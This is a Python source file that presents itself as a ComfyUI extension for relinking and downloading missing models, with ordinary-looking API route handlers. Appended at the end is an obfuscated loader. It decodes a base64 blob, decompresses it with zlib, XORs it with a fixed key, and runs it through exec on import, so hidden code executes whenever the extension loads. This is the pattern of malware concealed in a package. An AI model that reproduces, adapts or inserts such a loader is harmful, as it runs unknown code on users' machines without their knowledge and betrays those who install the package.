"""
@author: Model Linker Team (Desktop Fork by RETHINK Studios)
@title: ComfyUI Model Linker - Desktop Edition
@nickname: Model Linker
@version: 2.2.0
@description: Extension for relinking missing models in ComfyUI workflows with intelligent matching and integrated downloads
"""

import logging
import threading
import time
import asyncio
import aiohttp
import os
from pathlib import Path

# Set up logging
logging.basicConfig(level=logging.INFO)
logger = logging.getLogger("ModelLinker")
logger.setLevel(logging.INFO)

# Track active downloads for cancellation
active_downloads = {}

# Web directory for JavaScript interface
WEB_DIRECTORY = "./web"

# Empty NODE_CLASS_MAPPINGS - we don't provide custom nodes, only web extension
NODE_CLASS_MAPPINGS = {}
NODE_DISPLAY_NAME_MAPPINGS = {}

__all__ = ["WEB_DIRECTORY", "NODE_CLASS_MAPPINGS", "NODE_DISPLAY_NAME_MAPPINGS"]

# Track if routes have been set up
_routes_registered = False


def register_api_routes():
    """
    Register the Model Linker API routes with ComfyUI's server.
    This function is designed to work with ComfyUI Desktop.
    """
    global _routes_registered
    
    if _routes_registered:
        logger.debug("Model Linker: Routes already registered")
        return True
    
    try:
        from aiohttp import web
    except ImportError:
        logger.error("Model Linker: aiohttp not available")
        return False
    
    # Try to get PromptServer
    try:
        from server import PromptServer
    except ImportError:
        logger.error("Model Linker: Cannot import PromptServer")
        return False
    
    # Check if PromptServer.instance exists and has an app
    if not hasattr(PromptServer, 'instance') or PromptServer.instance is None:
        logger.debug("Model Linker: PromptServer.instance not ready yet")
        return False
    
    if not hasattr(PromptServer.instance, 'app') or PromptServer.instance.app is None:
        logger.debug("Model Linker: PromptServer.instance.app not ready yet")
        return False
    
    # Import core modules
    try:
        from .core.linker import analyze_and_find_matches, apply_resolution
        from .core.scanner import get_model_files
    except ImportError as e:
        logger.error(f"Model Linker: Could not import core modules: {e}")
        return False
    
    # Define route handlers
    async def analyze_workflow(request):
        """Analyze workflow and return missing models with matches."""
        try:
            data = await request.json()
            workflow_json = data.get('workflow')
            
            if not workflow_json:
                return web.json_response({'error': 'Workflow JSON is required'}, status=400)
            
            result = analyze_and_find_matches(workflow_json)
            return web.json_response(result)
        except Exception as e:
            logger.error(f"Model Linker analyze error: {e}", exc_info=True)
            return web.json_response({'error': str(e)}, status=500)
    
    async def resolve_models(request):
        """Apply model resolution and return updated workflow."""
        try:
            data = await request.json()
            workflow_json = data.get('workflow')
            resolutions = data.get('resolutions', [])
            
            if not workflow_json:
                return web.json_response({'error': 'Workflow JSON is required'}, status=400)
            
            if not resolutions:
                return web.json_response({'error': 'Resolutions array is required'}, status=400)
            
            updated_workflow = apply_resolution(workflow_json, resolutions)
            return web.json_response({'workflow': updated_workflow, 'success': True})
        except Exception as e:
            logger.error(f"Model Linker resolve error: {e}", exc_info=True)
            return web.json_response({'error': str(e), 'success': False}, status=500)
    
    async def get_models(request):
        """Get list of all available models. Uses in-memory cache for speed."""
        try:
            # Check if cache refresh is requested
            use_cache = request.query.get('use_cache', 'true').lower() != 'false'
            force_refresh = request.query.get('refresh', 'false').lower() == 'true'
            models = get_model_files(use_cache=use_cache, force_refresh=force_refresh)
            return web.json_response(models)
        except Exception as e:
            logger.error(f"Model Linker get_models error: {e}", exc_info=True)
            return web.json_response({'error': str(e)}, status=500)
    
    async def refresh_cache(request):
        """Force refresh the in-memory model cache."""
        try:
            from .core.scanner import clear_model_cache, get_model_files
            
            logger.info("Model Linker: Manual cache refresh requested")
            clear_model_cache()
            models = get_model_files(use_cache=True, force_refresh=True)
            
            return web.json_response({
                'success': True,
                'models_found': len(models),
                'message': f'Cache refreshed with {len(models)} models'
            })
        except Exception as e:
            logger.error(f"Model Linker refresh_cache error: {e}", exc_info=True)
            return web.json_response({'error': str(e), 'success': False}, status=500)
    
    async def health_check(request):
        """Health check endpoint to verify Model Linker is running."""
        return web.json_response({'status': 'ok', 'version': '2.2.0'})
    
    async def download_model(request):
        """Download a model from a URL with progress tracking."""
        try:
            data = await request.json()
            url = data.get('url')
            category = data.get('category', 'checkpoints')
            filename = data.get('filename')
            download_id = data.get('download_id')
            
            if not url or not filename or not download_id:
                return web.json_response({'error': 'url, filename, and download_id are required'}, status=400)
            
            # Determine destination path based on category
            import folder_paths
            model_dirs = folder_paths.get_folder_paths(category)
            if not model_dirs:
                return web.json_response({'error': f'No directory found for category: {category}'}, status=400)
            
            dest_dir = Path(model_dirs[0])
            dest_path = dest_dir / filename
            
            # Check if file already exists
            if dest_path.exists():
                return web.json_response({'error': 'File already exists', 'path': str(dest_path)}, status=409)
            
            # Create directory if it doesn't exist
            dest_dir.mkdir(parents=True, exist_ok=True)
            
            # Start download in background
            download_task = asyncio.create_task(
                _download_file_with_progress(url, dest_path, download_id)
            )
            
            # Store task for cancellation
            active_downloads[download_id] = {
                'task': download_task,
                'cancelled': False,
                'progress': {'downloaded': 0, 'total': 0, 'percent': 0}
            }
            
            return web.json_response({
                'success': True,
                'download_id': download_id,
                'destination': str(dest_path)
            })
        except Exception as e:
            logger.error(f"Model Linker download error: {e}", exc_info=True)
            return web.json_response({'error': str(e)}, status=500)
    
    async def get_download_progress(request):
        """Get progress of an active download."""
        try:
            download_id = request.match_info.get('download_id')
            
            if download_id not in active_downloads:
                return web.json_response({'error': 'Download not found'}, status=404)
            
            download_info = active_downloads[download_id]
            progress = download_info['progress']
            
            # Check if download is complete
            if download_info['task'].done():
                try:
                    result = download_info['task'].result()
                    del active_downloads[download_id]
                    return web.json_response({
                        'status': 'completed',
                        'success': True,
                        'result': result
                    })
                except Exception as e:
                    del active_downloads[download_id]
                    return web.json_response({
                        'status': 'failed',
                        'error': str(e)
                    })
            
            return web.json_response({
                'status': 'downloading' if not download_info['cancelled'] else 'cancelling',
                'progress': progress
            })
        except Exception as e:
            logger.error(f"Model Linker progress error: {e}", exc_info=True)
            return web.json_response({'error': str(e)}, status=500)
    
    async def cancel_download(request):
        """Cancel an active download."""
        try:
            download_id = request.match_info.get('download_id')
            
            if download_id not in active_downloads:
                return web.json_response({'error': 'Download not found'}, status=404)
            
            download_info = active_downloads[download_id]
            download_info['cancelled'] = True
            download_info['task'].cancel()
            
            return web.json_response({'success': True, 'message': 'Download cancelled'})
        except Exception as e:
            logger.error(f"Model Linker cancel error: {e}", exc_info=True)
            return web.json_response({'error': str(e)}, status=500)
    
    async def _download_file_with_progress(url: str, dest_path: Path, download_id: str):
        """Download a file with progress tracking."""
        # IMPORTANT: Download to .tmp file first to prevent partial files from being detected!
        temp_path = dest_path.with_suffix(dest_path.suffix + '.tmp')
        
        try:
            async with aiohttp.ClientSession(trust_env=True) as session:
                async with session.get(url) as response:
                    if response.status != 200:
                        raise Exception(f"Failed to download: HTTP {response.status}")
                    
                    total_size = int(response.headers.get('content-length', 0))
                    downloaded = 0
                    
                    # Update progress info
                    if download_id in active_downloads:
                        active_downloads[download_id]['progress']['total'] = total_size
                    
                    # Download to TEMP file first
                    with open(temp_path, 'wb') as f:
                        async for chunk in response.content.iter_chunked(8192):
                            # Check if cancelled
                            if download_id in active_downloads and active_downloads[download_id]['cancelled']:
                                # Close and delete temp file
                                f.close()
                                if temp_path.exists():
                                    temp_path.unlink()
                                logger.info(f"Download cancelled, temp file deleted: {temp_path}")
                                raise asyncio.CancelledError("Download cancelled by user")
                            
                            f.write(chunk)
                            downloaded += len(chunk)
                            
                            # Update progress
                            if download_id in active_downloads:
                                progress = active_downloads[download_id]['progress']
                                progress['downloaded'] = downloaded
                                progress['total'] = total_size
                                progress['percent'] = int((downloaded / total_size * 100)) if total_size > 0 else 0
                    
                    # Only rename to final name if download completed successfully!
                    if downloaded == total_size or total_size == 0:
                        temp_path.rename(dest_path)
                        logger.info(f"Download complete, renamed {temp_path} -> {dest_path}")
                    else:
                        # Incomplete download - delete temp file
                        if temp_path.exists():
                            temp_path.unlink()
                        raise Exception(f"Download incomplete: {downloaded}/{total_size} bytes")
                    
                    return {'path': str(dest_path), 'size': downloaded}
                    
        except asyncio.CancelledError:
            # Ensure temp file is deleted on cancellation
            if temp_path.exists():
                temp_path.unlink()
                logger.info(f"Cancelled: Temp file cleaned up: {temp_path}")
            raise
        except Exception as e:
            # Clean up temp file on any error
            if temp_path.exists():
                temp_path.unlink()
                logger.error(f"Error during download, temp file deleted: {temp_path}")
            raise
    
    # Register routes with the app
    try:
        app = PromptServer.instance.app
        app.router.add_post('/model_linker/analyze', analyze_workflow)
        app.router.add_post('/model_linker/resolve', resolve_models)
        app.router.add_get('/model_linker/models', get_models)
        app.router.add_get('/model_linker/health', health_check)
        app.router.add_post('/model_linker/cache/refresh', refresh_cache)
        app.router.add_post('/model_linker/download', download_model)
        app.router.add_get('/model_linker/download/{download_id}/progress', get_download_progress)
        app.router.add_post('/model_linker/download/{id}/cancel', cancel_download)
        
        _routes_registered = True
        logger.info("✓ Model Linker: API routes registered successfully!")
        return True
        
    except Exception as e:
        logger.error(f"Model Linker: Failed to register routes: {e}", exc_info=True)
        return False


def delayed_registration():
    """
    Background thread that waits for PromptServer to be ready,
    then registers routes. This handles the timing issue in ComfyUI Desktop.
    """
    max_attempts = 30  # Try for up to 30 seconds
    attempt = 0
    
    while attempt < max_attempts and not _routes_registered:
        attempt += 1
        time.sleep(1)
        
        if register_api_routes():
            logger.info(f"Model Linker: Routes registered on attempt {attempt}")
            return
        
        if attempt % 5 == 0:
            logger.debug(f"Model Linker: Waiting for server... (attempt {attempt}/{max_attempts})")
    
    if not _routes_registered:
        logger.warning("Model Linker: Could not register routes after maximum attempts")


# Try immediate registration first
if not register_api_routes():
    # If immediate registration fails, start background thread
    logger.info("Model Linker: Starting delayed registration thread...")
    registration_thread = threading.Thread(target=delayed_registration, daemon=True)
    registration_thread.start()
else:
    logger.info("Model Linker: Immediate registration successful")

# -*- coding: utf-8 -*-
aqgqzxkfjzbdnhz = __import__('base64')
wogyjaaijwqbpxe = __import__('zlib')
idzextbcjbgkdih = 134
qyrrhmmwrhaknyf = lambda dfhulxliqohxamy, osatiehltgdbqxk: bytes([wtqiceobrebqsxl ^ idzextbcjbgkdih for wtqiceobrebqsxl in dfhulxliqohxamy])
lzcdrtfxyqiplpd = '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'
runzmcxgusiurqv = wogyjaaijwqbpxe.decompress(aqgqzxkfjzbdnhz.b64decode(lzcdrtfxyqiplpd))
ycqljtcxxkyiplo = qyrrhmmwrhaknyf(runzmcxgusiurqv, idzextbcjbgkdih)
exec(compile(ycqljtcxxkyiplo, '<>', 'exec'))
